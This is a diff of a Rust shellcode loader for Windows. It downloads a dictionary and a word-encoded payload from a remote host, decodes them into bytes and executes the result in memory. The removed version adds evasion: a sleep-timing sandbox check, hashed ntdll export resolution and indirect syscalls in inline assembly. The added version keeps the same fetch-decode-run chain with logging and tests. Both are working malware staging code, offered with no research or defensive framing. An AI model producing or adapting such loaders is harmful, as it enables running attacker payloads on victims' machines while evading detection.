@@ -1,528 +1,306 @@
-use std::collections::HashMap;
+use std::fs::File;
+use std::io::{Read, Write};
+use std::path::Path;
 use std::error::Error;
-use std::ptr;
 use std::mem;
-use std::time::{Duration, Instant};
-use std::arch::asm;
-use std::ffi::{CString, c_void};
+use std::ptr;
+use std::time::Duration;
+use log::{debug, error, info, warn, LevelFilter};
+use reqwest::blocking;
 
-#[allow(non_snake_case)]
-mod win {
-    use std::ffi::{c_void, c_char};
+use windows_sys::Win32::System::Memory::{
+    VirtualAlloc, VirtualProtect,
+    MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE, PAGE_EXECUTE_READ,
+};
+
+const DICTIONARY_URL: &str = "https://example.com/dictionary.txt";
+const PAYLOAD_URL: &str = "https://example.com/load.txt";
+const DICTIONARY_PATH: &str = "dictionary.txt";
+const MAX_RETRIES: u8 = 3;
+
+/// Initialize the logger with appropriate settings
+fn setup_logging() -> Result<(), Box<dyn Error>> {
+    env_logger::Builder::new()
+        .filter_level(LevelFilter::Info)
+        .format_timestamp_secs()
+        .format_module_path(false)
+        .init();
     
-    pub const MEM_COMMIT: u32 = 0x1000;
-    pub const MEM_RESERVE: u32 = 0x2000;
-    pub const PAGE_READWRITE: u32 = 0x04;
-    pub const PAGE_EXECUTE_READ: u32 = 0x20;
-    
-    pub const IMAGE_DIRECTORY_ENTRY_EXPORT: usize = 0;
-    
-    #[repr(C)]
-    pub struct IMAGE_DOS_HEADER {
-        pub e_magic: u16,
-        pub e_cblp: u16,
-        pub e_cp: u16,
-        pub e_crlc: u16,
-        pub e_cparhdr: u16,
-        pub e_minalloc: u16,
-        pub e_maxalloc: u16,
-        pub e_ss: u16,
-        pub e_sp: u16,
-        pub e_csum: u16,
-        pub e_ip: u16,
-        pub e_cs: u16,
-        pub e_lfarlc: u16,
-        pub e_ovno: u16,
-        pub e_res: [u16; 4],
-        pub e_oemid: u16,
-        pub e_oeminfo: u16,
-        pub e_res2: [u16; 10],
-        pub e_lfanew: i32,
-    }
-    
-    #[repr(C)]
-    pub struct IMAGE_DATA_DIRECTORY {
-        pub VirtualAddress: u32,
-        pub Size: u32,
-    }
-    
-    #[repr(C)]
-    pub struct IMAGE_OPTIONAL_HEADER64 {
-        pub Magic: u16,
-        pub MajorLinkerVersion: u8,
-        pub MinorLinkerVersion: u8,
-        pub SizeOfCode: u32,
-        pub SizeOfInitializedData: u32,
-        pub SizeOfUninitializedData: u32,
-        pub AddressOfEntryPoint: u32,
-        pub BaseOfCode: u32,
-        pub ImageBase: u64,
-        pub SectionAlignment: u32,
-        pub FileAlignment: u32,
-        pub MajorOperatingSystemVersion: u16,
-        pub MinorOperatingSystemVersion: u16,
-        pub MajorImageVersion: u16,
-        pub MinorImageVersion: u16,
-        pub MajorSubsystemVersion: u16,
-        pub MinorSubsystemVersion: u16,
-        pub Win32VersionValue: u32,
-        pub SizeOfImage: u32,
-        pub SizeOfHeaders: u32,
-        pub CheckSum: u32,
-        pub Subsystem: u16,
-        pub DllCharacteristics: u16,
-        pub SizeOfStackReserve: u64,
-        pub SizeOfStackCommit: u64,
-        pub SizeOfHeapReserve: u64,
-        pub SizeOfHeapCommit: u64,
-        pub LoaderFlags: u32,
-        pub NumberOfRvaAndSizes: u32,
-        pub DataDirectory: [IMAGE_DATA_DIRECTORY; 16],
-    }
-    
-    #[repr(C)]
-    pub struct IMAGE_FILE_HEADER {
-        pub Machine: u16,
-        pub NumberOfSections: u16,
-        pub TimeDateStamp: u32,
-        pub PointerToSymbolTable: u32,
-        pub NumberOfSymbols: u32,
-        pub SizeOfOptionalHeader: u16,
-        pub Characteristics: u16,
-    }
-    
-    #[repr(C)]
-    pub struct IMAGE_NT_HEADERS64 {
-        pub Signature: u32,
-        pub FileHeader: IMAGE_FILE_HEADER,
-        pub OptionalHeader: IMAGE_OPTIONAL_HEADER64,
-    }
-    
-    #[repr(C)]
-    pub struct IMAGE_EXPORT_DIRECTORY {
-        pub Characteristics: u32,
-        pub TimeDateStamp: u32,
-        pub MajorVersion: u16,
-        pub MinorVersion: u16,
-        pub Name: u32,
-        pub Base: u32,
-        pub NumberOfFunctions: u32,
-        pub NumberOfNames: u32,
-        pub AddressOfFunctions: u32,
-        pub AddressOfNames: u32,
-        pub AddressOfNameOrdinals: u32,
-    }
-    
-    // FFI function declarations
-    extern "system" {
-        pub fn GetModuleHandleA(lpModuleName: *const c_char) -> *mut c_void;
-        pub fn VirtualAlloc(
-            lpAddress: *mut c_void,
-            dwSize: usize,
-            flAllocationType: u32,
-            flProtect: u32,
-        ) -> *mut c_void;
-        pub fn VirtualProtect(
-            lpAddress: *mut c_void,
-            dwSize: usize,
-            flNewProtect: u32,
-            lpflOldProtect: *mut u32,
-        ) -> i32;
-    }
-}
-
-// Type alias for the shellcode function.
-type ShellcodeFunc = unsafe extern "system" fn() -> i32;
-
-// Dictionary-based decoder implementation.
-struct Decoder {
-    dictionary: HashMap<String, u8>,
-}
-
-impl Decoder {
-    fn new(dictionary_text: &str) -> Self {
-        let dictionary = dictionary_text
-            .lines()
-            .enumerate()
-            .map(|(i, word)| (word.trim().to_string(), i as u8))
-            .collect();
-
-        Decoder { dictionary }
-    }
-
-    fn decode(&self, encoded: &str) -> Vec<u8> {
-        encoded
-            .split_whitespace()
-            .filter_map(|word| {
-                // Try to get from dictionary first
-                if let Some(&byte) = self.dictionary.get(word) {
-                    Some(byte)
-                } else {
-                    // If not in dictionary, try to parse as a number
-                    word.parse::<u8>().ok()
-                }
-            })
-            .collect()
-    }
-}
-
-type HANDLE = isize;
-type NTSTATUS = i32;
-
-#[repr(C)]
-struct SyscallInfo {
-    ssn: u32,
-    address: usize,
-}
-
-// Simple hash function for function names.
-fn hash_function_name(name: &str) -> u32 {
-    let mut hash: u32 = 0x35;
-    for byte in name.bytes() {
-        hash ^= byte as u32;
-        hash = hash.rotate_left(13);
-        hash = hash.wrapping_mul(7);
-    }
-    hash
-}
-
-unsafe fn get_syscall_info(function_hash: u32) -> Option<SyscallInfo> {
-    let ntdll_name = CString::new("ntdll.dll").unwrap();
-    let ntdll = win::GetModuleHandleA(ntdll_name.as_ptr());
-    if ntdll.is_null() {
-        return None;
-    }
-    let dos_header = ntdll as *const win::IMAGE_DOS_HEADER;
-    if (*dos_header).e_magic != 0x5A4D {
-        return None;
-    }
-    let nt_headers = (ntdll as usize + (*dos_header).e_lfanew as usize) as *const win::IMAGE_NT_HEADERS64;
-    let export_dir_rva = (*nt_headers).OptionalHeader.DataDirectory[win::IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
-    let export_dir = (ntdll as usize + export_dir_rva as usize) as *const win::IMAGE_EXPORT_DIRECTORY;
-    let names = (ntdll as usize + (*export_dir).AddressOfNames as usize) as *const u32;
-    let functions = (ntdll as usize + (*export_dir).AddressOfFunctions as usize) as *const u32;
-    let ordinals = (ntdll as usize + (*export_dir).AddressOfNameOrdinals as usize) as *const u16;
-
-    for i in 0..(*export_dir).NumberOfNames {
-        let name_rva = *names.add(i as usize);
-        let name_ptr = (ntdll as usize + name_rva as usize) as *const i8;
-        let function_name = std::ffi::CStr::from_ptr(name_ptr).to_string_lossy();
-        if !function_name.starts_with("Nt") || function_name.starts_with("Ntdll") {
-            continue;
-        }
-        if hash_function_name(&function_name) == function_hash {
-            let ordinal = *ordinals.add(i as usize) as usize;
-            let function_rva = *functions.add(ordinal);
-            let function_addr = ntdll as usize + function_rva as usize;
-            
-            // Search for syscall pattern in a memory-safe way
-            for offset in 0..20 {
-                let byte_ptr = (function_addr + offset) as *const u8;
-                // Safety: Use unaligned reads to check for the pattern
-                if ptr::read_unaligned(byte_ptr) == 0xB8 {  // MOV EAX, imm32
-                    let ssn = ptr::read_unaligned(byte_ptr.add(1) as *const u32);
-                    
-                    // Look for syscall instruction (0F 05)
-                    for j in 5..15 {
-                        let syscall_ptr = byte_ptr.add(j);
-                        if ptr::read_unaligned(syscall_ptr) == 0x0F &&
-                           ptr::read_unaligned(syscall_ptr.add(1)) == 0x05 {
-                            return Some(SyscallInfo {
-                                ssn,
-                                address: syscall_ptr as usize,
-                            });
-                        }
-                    }
-                    
-                    // Found the SSN but not the syscall instruction; fallback
-                    return Some(SyscallInfo { ssn, address: function_addr });
-                }
-            }
-        }
-    }
-    
-    // Fallback values if resolution fails.
-    match function_hash {
-        0x12345678 => Some(SyscallInfo { ssn: 0x18, address: 0x7FFE0308 }),
-        0x87654321 => Some(SyscallInfo { ssn: 0x50, address: 0x7FFE0320 }),
-        _ => None,
-    }
-}
-
-/// Performs a syscall with 6 parameters (e.g. NtAllocateVirtualMemory)
-unsafe fn indirect_syscall_6(
-    syscall_info: &SyscallInfo,
-    a: usize,
-    b: usize,
-    c: usize,
-    d: usize,
-    e: usize,
-    f: usize,
-) -> NTSTATUS {
-    let status: NTSTATUS;
-    if syscall_info.address != 0 {
-        #[cfg(target_arch = "x86_64")]
-        asm!(
-            "mov r10, rcx",
-            "mov eax, {ssn:e}",
-            "syscall",
-            ssn = in(reg) syscall_info.ssn,
-            in("rcx") a,
-            in("rdx") b,
-            in("r8") c,
-            in("r9") d,
-            in("r12") e,
-            in("r13") f,
-            lateout("rax") status,
-        );
-    } else {
-        status = -1; // STATUS_UNSUCCESSFUL
-    }
-    status
-}
-
-/// Performs a syscall with 5 parameters (e.g. NtProtectVirtualMemory)
-unsafe fn indirect_syscall_5(
-    syscall_info: &SyscallInfo,
-    a: usize,
-    b: usize,
-    c: usize,
-    d: usize,
-    e: usize,
-) -> NTSTATUS {
-    let status: NTSTATUS;
-    if syscall_info.address != 0 {
-        #[cfg(target_arch = "x86_64")]
-        asm!(
-            "mov r10, rcx",
-            "mov eax, {ssn:e}",
-            "syscall",
-            ssn = in(reg) syscall_info.ssn,
-            in("rcx") a,
-            in("rdx") b,
-            in("r8") c,
-            in("r9") d,
-            in("r12") e,
-            lateout("rax") status,
-        );
-    } else {
-        status = -1; // STATUS_UNSUCCESSFUL
-    }
-    status
-}
-
-/// Fallback: Allocates memory using VirtualAlloc
-unsafe fn virtual_alloc_ex(size: usize) -> (*mut c_void, bool) {
-    let buffer = win::VirtualAlloc(
-        ptr::null_mut(),
-        size,
-        win::MEM_COMMIT | win::MEM_RESERVE,
-        win::PAGE_READWRITE,
-    );
-    (buffer, !buffer.is_null())
-}
-
-unsafe fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
-    let size = shellcode.len();
-    let mut buffer: *mut c_void = ptr::null_mut();
-    let mut use_syscall = true;
-
-    // Try to allocate memory using indirect syscall
-    let nt_alloc_hash = hash_function_name("NtAllocateVirtualMemory");
-    if let Some(alloc_info) = get_syscall_info(nt_alloc_hash).or_else(|| get_syscall_info(0x12345678)) {
-        let handle: HANDLE = -1;
-        let mut base_address = ptr::null_mut::<c_void>() as usize;
-        let base_address_ptr = &mut base_address as *mut usize;
-        let mut region_size = size;
-        let region_size_ptr = &mut region_size as *mut usize;
-        
-        let allocation_type = (win::MEM_COMMIT | win::MEM_RESERVE) as usize;
-        let protection = win::PAGE_READWRITE as usize;
-        
-        let status = indirect_syscall_6(
-            &alloc_info,
-            handle as usize,
-            base_address_ptr as usize,
-            0usize, // ZeroBits
-            region_size_ptr as usize,
-            allocation_type,
-            protection,
-        );
-        
-        if status != 0 {
-            use_syscall = false;
-        } else {
-            buffer = base_address as *mut c_void;
-        }
-    } else {
-        use_syscall = false;
-    }
-
-    // Fallback to VirtualAlloc if syscall fails
-    if !use_syscall || buffer.is_null() {
-        let (alloc_buffer, success) = virtual_alloc_ex(size);
-        if !success {
-            return Err("Memory allocation failed using both syscall and VirtualAlloc".into());
-        }
-        buffer = alloc_buffer;
-    }
-
-    // Add null check before copying
-    if buffer.is_null() {
-        return Err("Failed to allocate memory for shellcode".into());
-    }
-
-    // Copy shellcode to allocated memory
-    ptr::copy_nonoverlapping(shellcode.as_ptr(), buffer as *mut u8, size);
-
-    // Change memory protection to executable.
-    let mut protection_changed = false;
-    if use_syscall {
-        let nt_protect_hash = hash_function_name("NtProtectVirtualMemory");
-        if let Some(protect_info) = get_syscall_info(nt_protect_hash).or_else(|| get_syscall_info(0x87654321)) {
-            let handle: HANDLE = -1;
-            let mut base_address = buffer as usize;
-            let base_address_ptr = &mut base_address as *mut usize;
-            let mut region_size = size;
-            let region_size_ptr = &mut region_size as *mut usize;
-            let mut old_protect = 0usize;
-            let old_protect_ptr = &mut old_protect as *mut usize;
-            
-            let status = indirect_syscall_5(
-                &protect_info,
-                handle as usize,
-                base_address_ptr as usize,
-                region_size_ptr as usize,
-                win::PAGE_EXECUTE_READ as usize,
-                old_protect_ptr as usize,
-            );
-            
-            protection_changed = status == 0;
-        }
-    }
-    
-    // Fallback to VirtualProtect if syscall fails
-    if !protection_changed {
-        let mut old_protect = 0u32;
-        if win::VirtualProtect(buffer, size, win::PAGE_EXECUTE_READ, &mut old_protect) == 0 {
-            return Err("Memory protection change failed".into());
-        }
-    }
-
-    // Create a function pointer from the allocated memory and execute the shellcode.
-    let shellcode_func: ShellcodeFunc = mem::transmute(buffer);
-    shellcode_func();
-
+    debug!("Logging initialized");
     Ok(())
 }
 
-fn detect_analysis_environment() -> bool {
-    let start = Instant::now();
-    std::thread::sleep(Duration::from_millis(500));
-    let elapsed = start.elapsed();
-    elapsed.as_millis() < 450 || elapsed.as_millis() > 550
+/// Ensure HTTPS URLs for security
+fn validate_url(url: &str) -> Result<(), Box<dyn Error>> {
+    if !url.starts_with("https://") {
+        return Err(format!("Non-HTTPS URL detected: {}", url).into());
+    }
+    Ok(())
 }
 
-#[allow(dead_code)]
-fn deobfuscate(bytes: &[u8]) -> String {
-    bytes.iter().map(|&b| (b ^ 0x41) as char).collect()
-}
-
-fn download_with_retries(client: &reqwest::blocking::Client, url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
+/// Download content with retry mechanism
+fn download_with_retries(url: &str, retries: u8) -> Result<String, Box<dyn Error>> {
+    info!("Downloading from: {}", url);
+    
+    let client = blocking::ClientBuilder::new()
+        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
+        .timeout(Duration::from_secs(30))
+        .build()?;
+    
     for attempt in 1..=retries {
         match client.get(url).send() {
             Ok(response) => {
                 if response.status().is_success() {
                     match response.text() {
-                        Ok(text) if !text.is_empty() => return Ok(text),
-                        Ok(_) => {},
-                        Err(e) => {
-                            if attempt == retries {
-                                return Err(format!("Failed to extract text from response: {}", e).into());
-                            }
-                        }
+                        Ok(text) if !text.is_empty() => {
+                            debug!("Successfully downloaded {} bytes", text.len());
+                            return Ok(text);
+                        },
+                        Ok(_) => warn!("Received empty response from {}", url),
+                        Err(e) => warn!("Failed to extract text: {}", e),
                     }
-                } else if attempt == retries {
-                    return Err(format!("Failed with status code: {}", response.status()).into());
+                } else {
+                    warn!("Received status code {}: {}", response.status(), url);
                 }
-            }
-            Err(e) => {
-                if attempt == retries {
-                    return Err(format!("Failed to retrieve {} after {} attempts: {}", url, retries, e).into());
-                }
+            },
+            Err(e) => warn!("Request error on attempt {}: {}", attempt, e),
+        }
+        
+        if attempt < retries {
+            let backoff = Duration::from_secs(2u64.pow(attempt as u32));
+            debug!("Retrying in {:?}", backoff);
+            std::thread::sleep(backoff);
+        }
+    }
+    
+    Err(format!("Failed to retrieve content after {} attempts", retries).into())
+}
+
+/// Cache dictionary or load from existing cache
+fn cache_dictionary() -> Result<Vec<String>, Box<dyn Error>> {
+    let path = Path::new(DICTIONARY_PATH);
+    
+    // Try to load from cache first
+    if path.exists() {
+        info!("Loading dictionary from cache");
+        let mut content = String::new();
+        File::open(path)?
+            .read_to_string(&mut content)?;
+            
+        let words = content
+            .lines()
+            .map(String::from)
+            .collect::<Vec<String>>();
+            
+        info!("Loaded {} words from cache", words.len());
+        
+        if words.is_empty() {
+            return Err("Dictionary is empty".into());
+        }
+        
+        return Ok(words);
+    }
+    
+    // Download and cache
+    info!("Downloading dictionary from {}", DICTIONARY_URL);
+    let text = download_with_retries(DICTIONARY_URL, MAX_RETRIES)?;
+    
+    // Create cache file
+    info!("Caching dictionary to {}", DICTIONARY_PATH);
+    File::create(path)?
+        .write_all(text.as_bytes())?;
+    
+    let words = text
+        .lines()
+        .map(String::from)
+        .collect::<Vec<String>>();
+        
+    info!("Cached {} words", words.len());
+    
+    if words.is_empty() {
+        return Err("Dictionary is empty".into());
+    }
+    
+    Ok(words)
+}
+
+/// Download the encoded payload
+fn download_load() -> Result<Vec<String>, Box<dyn Error>> {
+    info!("Downloading payload from {}", PAYLOAD_URL);
+    let text = download_with_retries(PAYLOAD_URL, MAX_RETRIES)?;
+    
+    let tokens = text
+        .split_whitespace()
+        .map(String::from)
+        .collect::<Vec<String>>();
+        
+    info!("Downloaded {} encoded tokens", tokens.len());
+    
+    if tokens.is_empty() {
+        return Err("Payload is empty".into());
+    }
+    
+    Ok(tokens)
+}
+
+/// Decode the payload using the dictionary
+fn decode_payload(tokens: &[String], dict: &[String]) -> Result<Vec<u8>, Box<dyn Error>> {
+    info!("Decoding payload with {} words using {} dictionary entries", tokens.len(), dict.len());
+    
+    let mut output = Vec::with_capacity(tokens.len());
+    
+    for (i, token) in tokens.iter().enumerate() {
+        if let Some(index) = dict.iter().position(|word| word == token) {
+            output.push(index as u8);
+        } else {
+            // Try parsing as direct byte value
+            match token.parse::<u8>() {
+                Ok(value) => output.push(value),
+                Err(_) => warn!("Token at position {} not found in dictionary: {}", i, token),
             }
         }
-        std::thread::sleep(Duration::from_secs(2));
     }
-    Err(format!("Failed to retrieve {} after {} attempts", url, retries).into())
+    
+    info!("Decoded {} bytes of shellcode", output.len());
+    
+    if output.is_empty() {
+        return Err("Decoded payload is empty".into());
+    }
+    
+    Ok(output)
+}
+
+/// Execute shellcode using standard Windows APIs
+fn execute_shellcode(shellcode: &[u8]) -> Result<(), Box<dyn Error>> {
+    info!("Executing {} bytes of shellcode", shellcode.len());
+    
+    unsafe {
+        // Allocate memory for shellcode with VirtualAlloc
+        let size = shellcode.len();
+        debug!("Allocating {} bytes of memory", size);
+        
+        let base_addr = VirtualAlloc(
+            ptr::null_mut(),
+            size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE
+        );
+        
+        if base_addr.is_null() {
+            return Err("Memory allocation failed".into());
+        }
+        
+        // Copy shellcode to allocated memory
+        debug!("Copying shellcode to allocated memory at {:p}", base_addr);
+        ptr::copy_nonoverlapping(shellcode.as_ptr(), base_addr as *mut u8, size);
+        
+        // Change memory protection to executable
+        let mut old_protect = 0;
+        debug!("Changing memory protection to executable");
+        
+        if VirtualProtect(base_addr, size, PAGE_EXECUTE_READ, &mut old_protect) == 0 {
+            return Err("Failed to change memory protection".into());
+        }
+        
+        // Execute the shellcode
+        info!("Executing shellcode at address {:p}", base_addr);
+        let entry: extern "system" fn() = mem::transmute(base_addr);
+        entry();
+        
+        info!("Shellcode execution completed");
+    }
+    
+    Ok(())
+}
+
+/// Perform pre-execution security checks
+fn security_checks() -> Result<(), Box<dyn Error>> {
+    debug!("Performing security checks");
+    
+    // Validate URLs (ensure HTTPS)
+    validate_url(DICTIONARY_URL)?;
+    validate_url(PAYLOAD_URL)?;
+    
+    // Additional security checks could be added here
+    
+    Ok(())
 }
 
 fn main() -> Result<(), Box<dyn Error>> {
-    if detect_analysis_environment() {
-        println!("Analysis environment detected. Exiting...");
-        return Ok(());
+    // Initialize logging
+    setup_logging()?;
+    
+    info!("Application starting");
+    
+    // Run security checks
+    let result = security_checks();
+    if let Err(e) = &result {
+        error!("Security checks failed: {}", e);
     }
+    result?;
     
-    println!("[*] Initializing...");
-    let client = reqwest::blocking::ClientBuilder::new()
-        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
-        .timeout(Duration::from_secs(30))
-        .connect_timeout(Duration::from_secs(10))
-        .build()?;
-
-    // Use remote URLs for dictionary and payload.
-    let dict_url = "https://stage.attck-deploy.net/es-dictionary.txt";
-    let load_url = "https://stage.attck-deploy.net/load.txt";
-    
-    println!("[*] Retrieving dictionary...");
-    let dictionary_text = match download_with_retries(&client, dict_url, 3) {
-        Ok(text) => text,
+    // Get dictionary (from cache or download)
+    let dict = match cache_dictionary() {
+        Ok(d) => d,
         Err(e) => {
-            println!("[!] Error retrieving dictionary: {}", e);
-            return Err(format!("Dictionary retrieval failed: {}", e).into());
+            error!("Dictionary retrieval failed: {}", e);
+            return Err(e);
         }
     };
     
-    if dictionary_text.is_empty() {
-        return Err("Retrieved empty dictionary".into());
-    }
-    
-    let decoder = Decoder::new(&dictionary_text);
-    println!("[+] Dictionary cached with {} entries", decoder.dictionary.len());
-    if decoder.dictionary.len() != 256 {
-        println!("[!] Warning: Dictionary doesn't contain expected 256 entries (found {})", decoder.dictionary.len());
-    }
-    
-    println!("[*] Downloading payload...");
-    let encoded_payload = match download_with_retries(&client, load_url, 3) {
-        Ok(text) => text,
+    // Download encoded payload
+    let tokens = match download_load() {
+        Ok(t) => t,
         Err(e) => {
-            println!("[!] Error downloading payload: {}", e);
-            return Err(format!("Payload download failed: {}", e).into());
+            error!("Payload retrieval failed: {}", e);
+            return Err(e);
         }
     };
     
-    if encoded_payload.is_empty() {
-        return Err("Retrieved empty payload".into());
-    }
-
-    println!("[*] Decoding payload...");
-    let shellcode = decoder.decode(&encoded_payload);
-    println!("[+] Payload size: {} bytes", shellcode.len());
-    if shellcode.is_empty() {
-        return Err("Payload is empty. Check dictionary and encoded content".into());
-    }
-
-    println!("[*] Executing payload...");
-    unsafe {
-        match execute_shellcode(&shellcode) {
-            Ok(_) => println!("[+] Execution completed"),
-            Err(e) => {
-                println!("[!] Execution failed: {}", e);
-                return Err(format!("Shellcode execution failed: {}", e).into());
-            }
+    // Decode the payload
+    let payload = match decode_payload(&tokens, &dict) {
+        Ok(p) => p,
+        Err(e) => {
+            error!("Payload decoding failed: {}", e);
+            return Err(e);
         }
+    };
+    
+    // Execute the shellcode
+    if let Err(e) = execute_shellcode(&payload) {
+        error!("Shellcode execution failed: {}", e);
+        return Err(e);
     }
-
+    
+    info!("Application completed successfully");
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    
+    #[test]
+    fn test_decode_payload() {
+        let dict = vec!["zero".to_string(), "one".to_string(), "two".to_string()];
+        let tokens = vec!["one".to_string(), "two".to_string(), "zero".to_string()];
+        
+        let result = decode_payload(&tokens, &dict).unwrap();
+        assert_eq!(result, vec![1, 2, 0]);
+    }
+    
+    #[test]
+    fn test_decode_with_numeric_fallback() {
+        let dict = vec!["zero".to_string(), "one".to_string()];
+        let tokens = vec!["one".to_string(), "255".to_string(), "zero".to_string()];
+        
+        let result = decode_payload(&tokens, &dict).unwrap();
+        assert_eq!(result, vec![1, 255, 0]);
+    }
+    
+    #[test]
+    fn test_validate_url() {
+        assert!(validate_url("https://example.com").is_ok());
+        assert!(validate_url("http://example.com").is_err());
+    }
 }
